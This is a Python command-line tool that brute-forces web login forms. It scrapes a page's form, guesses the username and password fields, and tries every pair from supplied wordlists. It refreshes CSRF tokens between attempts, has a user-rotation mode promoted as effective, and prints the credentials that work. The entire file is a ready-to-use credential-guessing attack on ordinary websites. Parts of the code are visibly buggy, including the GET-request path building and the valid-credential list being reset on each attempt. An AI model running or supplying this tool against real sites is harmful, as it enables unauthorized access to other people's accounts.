#!/usr/bin/env python3
import requests, argparse
from sys import exit
from bs4 import BeautifulSoup
from termcolor import cprint
from os import system as cmd

banner = """
█░░ █▀█ █▀▀ █ █▄░█   █▀▀ █▀█ █▀█ █▀▄▀█   █▄▄ █▀█ █░█ ▀█▀ █▀▀ █▀▀ █▀█ █▀█ █▀▀ █▀▀ █▀█
█▄▄ █▄█ █▄█ █ █░▀█   █▀░ █▄█ █▀▄ █░▀░█   █▄█ █▀▄ █▄█ ░█░ ██▄ █▀░ █▄█ █▀▄ █▄▄ ██▄ █▀▄

     █▄▄ █▀▀ █░█ █ █▄░█ █▀▄ █▄█ █▄▀ ▄█
by @ █▄█ ██▄ █▀█ █ █░▀█ █▄▀ ░█░ █░█ ░█\n"""
cprint(banner, "red")

parser = argparse.ArgumentParser()
parser.add_argument(
	"--url",
	type=str,
	metavar="url",
	help="Url that contains the form to brute.",
	required=True
	)
parser.add_argument(
	"-P",
	type=str,
	metavar="password_wordlist",
	help="Password wordlist to use (separated by newline).",
	required=True
	)
parser.add_argument(
	"-U",
	type=str,
	metavar="username_wordlist",
	help="Username wordlist to use (separated by newline).",
	required=True
	)
parser.add_argument(
	"--error_msg",
	type=str,
	metavar="error_msg",
	help="Error message to avoid.",
	required=True
	)
parser.add_argument(
	"-f",
	help="Stops when a valid combination is found.",
	action="store_true",
	required=False
	)
parser.add_argument(
	"-vv",
	help="Verbose mode",
	action="store_true",
	required=False
	)
parser.add_argument(
	"--javascript",
	help="Is the website using javascript to render forms?",
	action="store_true",
	required=False
	)
parser.add_argument(
	"-u",
	help="Rotate users rather than passwords (Effective!).",
	action="store_true",
	required=False
	)
args = parser.parse_args()

global url, pwd_wl, usr_wl, error_msg, verbosity, is_javascript, session, form_parameters, base_url, schema, rotate_users
url = args.url
pwd_wl = args.P
usr_wl = args.U
error_msg = args.error_msg
verbosity = args.vv
is_javascript = args.javascript
stop_if_valid = args.f
rotate_users = args.u

session = requests.Session()

if url.startswith("http://"):
	base_url = url.replace("http://", "").split("/")[0]
	schema = "http://"
elif url.startswith("https://"):
	base_url = url.replace("https://", "").split("/")[0]
	schema = "https://"
else:
	cprint("[!] Please provide a valid protocol schema (http or https)", "red")
	exit()

def get_forms(url):
	try:
		r = session.get(url)
	except requests.exceptions.InvalidURL:
		cprint("\n[!] Invalid URL.", "red")
		exit()
	if is_javascript:
		r.html.render()
	soup = BeautifulSoup(r.text, "html.parser")
	forms = soup.find("form")
	if forms == None:
		cprint("\n[-] Could not find any form in the specified url.", "red")
		exit()
	else:
		return forms

def get_forms_parameters(form):
	params = {}
	action = form.attrs.get("action").lower()
	method = form.attrs.get("method", "get").lower()
	form_name = form.attrs.get("name").lower()
	names = []
	for input in form.find_all("input"):
		name = input.attrs.get("name")
		names.append(name)
	params["action"] = action #url
	params["method"] = method
	params["form_name"] = form_name
	params["names"] = names
	return params

def bruteforce(form_parameters):
	#{'action': 'login.jsp', 'method': 'post', 'form_name': 'loginform', 'names': ['url', 'login', 'csrf', 'username', 'password']}
	path = f"{schema}{base_url}/{form_parameters['action']}"
	payload = {}
	for i in form_parameters["names"]:
		payload[i] = ""
		t = 0
		for char in ["u", "s", "r"]:
			if char in i:
				t += 1
				if t == 3:
					user_param = i # defining user parameter in the form
					continue
		t = 0
		for char in ["p", "w", "d"]:
			if char in i:
				t += 1
				if t == 3 or "pass" in i:
					pass_param = i # defining pass parameter in the form
					continue
	c = session.cookies.get_dict()
	if "csrf" in payload.keys():
		payload["csrf"] = c["csrf"]
	if "login" in payload.keys():
		payload["login"] = "true"
	try:
		with open(usr_wl) as fp:
			usernames = [x.rstrip() for x in fp.readlines()]
		with open(pwd_wl) as fp:
			passwords = [x.rstrip() for x in fp.readlines()]
	except:
		cprint("[-] A specified wordlist doesn't exists.", "red")
		exit()
	total = 0
	iu = 0 #index for user
	ip = 0 #index for password
	while True:
		for username in usernames:
			payload[user_param] = username
			for password in passwords:
				
				if rotate_users:
					payload[user_param] = usernames[iu]
					payload[pass_param] = passwords[ip]
					if iu == len(usernames)-1: # avoid index error (-1)
						iu = 0 # resetting users
						ip += 1 # iterating one over passwords
					else:
						iu += 1 # while not the max index, adds 1 
				else:
					payload[pass_param] = password # if not rotate users, rotate passwords

				if form_parameters["method"] == "post":
					login = session.post(path, data=payload)
				elif form_parameters["method"] == "get":
					path += "?"
					for key in payload:
						new_p = path + f"{key}={payload[key]}&"
					new_p = new_p[:-1] # cleaning & at the end
					login = session.get(new_p)
				else:
					cprint("[-] The form is using a method that the script doesnt cover. Exiting...", "red")
					exit()
				c = session.cookies.get_dict()
				if "csrf" in payload.keys():
					payload["csrf"] = c["csrf"]
				total += 1
				valid_creds = []
				if error_msg not in login.text:
					cprint(f"[+] Valid combination found!   [ {payload[user_param]}:{payload[pass_param]} ]", "green")
					if stop_if_valid:
						exit()
					else:
						valid_creds.append([{payload[user_param]}, {payload[pass_param]}])
				else:
					cmd("clear")
					if verbosity:
						print(f"{valid_creds if len(valid_creds) >= 1 else '[-] No valid credentials until now'}\n[{total}] Trying: {payload[user_param]}:{payload[pass_param]} ({total * 100 // (len(passwords)*len(usernames))}%)")
					else:
						cprint("[+] Working...", "green")

def main():
	# Checking if the user wants to continue or not
	form_parameters = get_forms_parameters(get_forms(url))
	try:
		cprint(f"[+] Found a form named {form_parameters['form_name']}, would you like to proceed using it? ", "green", end="")
		continue_or_not = input("[Y/n] ").lower()
		if continue_or_not == "y" or continue_or_not == "":
			pass
		else:
			cprint("[!] Exiting...", "red")
			exit()
		bruteforce(form_parameters)
	except KeyboardInterrupt:
		cprint("\n\n[!] User aborted...\n\n", "red")
		exit()
	except IndexError:
		cprint("[+] Done!", "green")
		exit()


main()
